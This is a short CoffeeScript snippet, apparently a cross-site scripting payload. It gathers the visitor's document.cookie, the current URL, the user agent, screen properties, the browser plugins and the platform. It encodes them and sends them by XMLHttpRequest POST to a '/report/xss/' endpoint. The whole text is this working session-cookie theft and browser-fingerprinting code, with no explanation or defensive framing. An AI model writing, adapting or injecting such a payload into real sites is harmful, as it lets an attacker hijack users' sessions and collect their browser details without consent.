# cookie
d = 'c=' + encodeURIComponent(document.cookie)

# url
d += '&u=' + encodeURIComponent(window.location.href)

# useragent 
d += '&ua=' + encodeURIComponent(navigator.userAgent)

# screen
s = ''
for k, v of screen
  s += k + ':' + v + ';'
d += '&s=' + encodeURIComponent(s)

# plugins, platform
a = 'Plugins:'
for p in navigator.plugins
  a += (p.name || '') + ', '
a += '; Platform:' + navigator.platform + ';'
d += '&a=' + encodeURIComponent(a)

xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
xmlhttp.open("POST","/report/xss/",true);
xmlhttp.send(d);
